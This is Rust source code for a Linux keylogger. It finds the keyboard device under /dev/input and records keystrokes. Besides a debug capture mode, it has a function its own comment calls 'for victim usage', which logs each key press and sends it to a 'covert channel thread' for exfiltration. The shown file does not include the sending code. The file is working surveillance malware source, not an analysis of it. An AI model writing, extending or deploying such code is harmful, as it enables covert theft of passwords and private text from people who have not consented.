use evdev::{Device, EventSummary, KeyCode, RelativeAxisCode, BusType};
use std::fs;
use std::sync::mpsc::{self, Receiver, Sender};
use std::time::Instant;
use std::io::{self, Write};

#[derive(Debug)]
pub enum Control {
    Stop,
    // You can easily add more later, e.g.:
    // Pause,
    // Resume,
    // ChangeDevice(String),
}

#[derive(Default, Debug)]
struct Modifiers {
    shift: bool,
    ctrl: bool,
    alt: bool,
    meta: bool,
    capslock: bool,
}

impl Modifiers {
    fn update(&mut self, key: KeyCode, value: i32) {
        let pressed = value == 1;

        match key {
            KeyCode::KEY_LEFTSHIFT | KeyCode::KEY_RIGHTSHIFT => self.shift = pressed,
            KeyCode::KEY_LEFTCTRL | KeyCode::KEY_RIGHTCTRL => self.ctrl = pressed,
            KeyCode::KEY_LEFTALT | KeyCode::KEY_RIGHTALT => self.alt = pressed,
            KeyCode::KEY_LEFTMETA | KeyCode::KEY_RIGHTMETA => self.meta = pressed,
            KeyCode::KEY_CAPSLOCK if pressed => self.capslock = !self.capslock,
            _ => {}
        }
    }

    fn display(&self) -> String {
        let mut parts = Vec::new();
        if self.shift { parts.push("SHIFT"); }
        if self.ctrl { parts.push("CTRL"); }
        if self.alt { parts.push("ALT"); }
        if self.meta { parts.push("META"); }
        if self.capslock { parts.push("CAPS"); }

        if parts.is_empty() {
            "none".to_string()
        } else {
            parts.join(" ")
        }
    }
}

fn find_keyboard() -> io::Result<(Device, String)> {
    let mut candidates = Vec::new();

    for entry in fs::read_dir("/dev/input")? {
        let path = entry?.path();
        if !path.to_string_lossy().contains("event") { continue; }

        if let Ok(device) = Device::open(&path) {
            let Some(keys) = device.supported_keys() else { continue; };
            let rel_axes = device.supported_relative_axes();
            let abs_axes = device.supported_absolute_axes();

            if rel_axes.is_some() || abs_axes.is_some() {
                continue; 
            }

            if keys.contains(KeyCode::KEY_A) 
                && keys.contains(KeyCode::KEY_F1) 
                && keys.contains(KeyCode::KEY_F10) 
            {
                candidates.push((device, path.to_string_lossy().to_string()));
            }
        }
    }

    if let Some(final_choice) = candidates.pop() {
        println!("Selected keyboard: {}", final_choice.0.name().unwrap_or("Unknown"));
        return Ok(final_choice);
    }

    Err(io::Error::new(io::ErrorKind::NotFound, "No suitable keyboard found"))
}

/// 🔧 Proper Parallels Remapping
fn parallels_remap(key: KeyCode) -> KeyCode {
    match key {
        KeyCode::KEY_LEFTMETA => KeyCode::KEY_LEFTALT,
        KeyCode::KEY_RIGHTMETA => KeyCode::KEY_RIGHTALT,
        KeyCode::KEY_LEFTALT => KeyCode::KEY_LEFTMETA,
        KeyCode::KEY_RIGHTALT => KeyCode::KEY_RIGHTMETA,
        _ => key,
    }
}

/// Original standalone / debug version — completely unchanged
pub fn run() -> io::Result<()> {
    let (mut device, path) = find_keyboard()?;
    
    println!("Capturing key events from: {}", path);
    println!("Device name: {}", device.name().unwrap_or("Unknown"));
    println!("Device path: {}", path);
    
    let id = device.input_id();
    println!(
        "Device ID: bus=0x{:?} vendor=0x{:04x} product=0x{:04x} version=0x{:04x}",
        id.bus_type(),
        id.vendor(),
        id.product(),
        id.version()
    );
    
    println!();
    println!("Press Ctrl+C to stop...");
    println!("===========================================================================");
    println!("{:<15} {:<10} {:<20} {:<10} {:<20}",
        "RelTime", "Type", "Code", "Value", "Modifiers");
    println!("===========================================================================");
    
    let running = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(true));
    let r = running.clone();
    
    ctrlc::set_handler(move || {
        r.store(false, std::sync::atomic::Ordering::SeqCst);
    }).expect("Error setting Ctrl+C handler");
    
    let start_time = Instant::now();
    let mut modifiers = Modifiers::default();
    let mut printed_since_syn = false;
    
    while running.load(std::sync::atomic::Ordering::SeqCst) {
        for ev in device.fetch_events()? {
            let rel = start_time.elapsed();
            let rel_str = format!(
                "+{:>3}.{:06}",
                rel.as_secs(),
                rel.subsec_micros()
            );
    
            match ev.destructure() {
                EventSummary::Key(_, raw_key, value) => {
                    let key = parallels_remap(raw_key);
    
                    let value_str = match value {
                        0 => "RELEASE",
                        1 => "PRESS",
                        2 => "REPEAT",
                        _ => "UNKNOWN",
                    };
    
                    println!("{:<15} {:<10} {:<20} {:<10} [{}]",
                        rel_str,
                        "EV_KEY",
                        format!("{:?}", key),
                        value_str,
                        modifiers.display()
                    );
    
                    modifiers.update(key, value);
                    printed_since_syn = true;
                }
    
                EventSummary::Synchronization(..) if printed_since_syn => {
                    println!("{:<15} {:<10} {:<20} {:<10} [---event boundary---]",
                        rel_str,
                        "EV_SYN",
                        "SYN_REPORT",
                        "0"
                    );
                    printed_since_syn = false;
                }
    
                _ => {}
            }
        }
    }
    
    println!("\nCapture stopped.");
    Ok(())
}

/// New function for victim usage — uses channel for control + channel for captured keys
pub fn run_with_control(
    control_rx: Receiver<Control>,
    key_tx:     Sender<String>,
) -> io::Result<()> {
    let (mut device, _path) = find_keyboard()?;
    
    // Very important: non-blocking mode so we can check control channel periodically
    device.set_nonblocking(true)?;

    let start_time = Instant::now();
    let mut modifiers = Modifiers::default();

    loop {
        // ── Check control channel (non-blocking) ────────────────────────────────
        match control_rx.try_recv() {
            Ok(Control::Stop) => {
                println!("[keylogger] Received Stop command → exiting");
                break;
            }
            Err(mpsc::TryRecvError::Empty) => {
                // no command yet → continue
            }
            Err(mpsc::TryRecvError::Disconnected) => {
                println!("[keylogger] Control channel closed → exiting");
                break;
            }
        }

        // ── Read events ─────────────────────────────────────────────────────────
        match device.fetch_events() {
            Ok(events) => {
                for ev in events {
                    if let EventSummary::Key(_, raw_key, value) = ev.destructure() {
                        // Typically we only log PRESS events (value == 1)
                        if value != 1 {
                            continue;
                        }

                        let key = parallels_remap(raw_key);
                        let key_name = format!("{:?}", key).replace("KEY_", "");

                        // Very basic modifier prefix (you can improve this a lot)
                        let mut output = String::new();
                        if modifiers.shift   { output.push_str("[SHIFT] "); }
                        if modifiers.capslock { output.push_str("[CAPS] ");  }
                        output.push_str(&key_name);
                        output.push(' ');

                        // Send captured key line to the covert channel thread
                        if key_tx.send(output).is_err() {
                            println!("[keylogger] Data channel closed → exiting");
                            return Ok(());
                        }

                        // Still update internal state
                        modifiers.update(key, value);
                    }
                }
            }

            Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
                // No events available right now → small sleep + loop again
                std::thread::sleep(std::time::Duration::from_millis(6));
            }

            Err(e) => {
                eprintln!("[keylogger] fetch_events error: {:?}", e);
                return Err(e);
            }
        }
    }

    println!("[keylogger] Thread terminated cleanly.");
    Ok(())
}

#[allow(dead_code)]
fn main() -> io::Result<()> {
    // Keep your original debug entry point
    run()
}
